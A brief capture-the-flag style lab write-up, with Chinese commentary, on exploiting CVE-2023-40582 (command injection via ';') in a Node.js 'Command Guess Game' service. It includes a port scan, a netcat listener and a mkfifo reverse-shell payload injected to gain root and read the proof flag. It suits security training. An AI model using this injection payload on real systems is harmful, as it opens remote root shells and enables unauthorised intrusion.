###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# CVE-2023-40582
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.219.36 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.219.36:22
Open 192.168.219.36:3000

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    syn-ack Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Command Guess Game
```

搜尋[CVE-2023-40582](https://security.snyk.io/vuln/SNYK-JS-FINDEXEC-5876637)可以藉由`;`後面接惡意指令進行遠端程式碼執行攻擊，開啟nc，在指令框打上bash指令，等反彈得root，到/root得proof.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.175 9001 >/tmp/f

# whoami
root
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@ubuntu:/usr/src/app# cd /root
root@ubuntu:~# cat proof.txt
08e38ae65e5d72f41cad6eb0139f9a2f
```
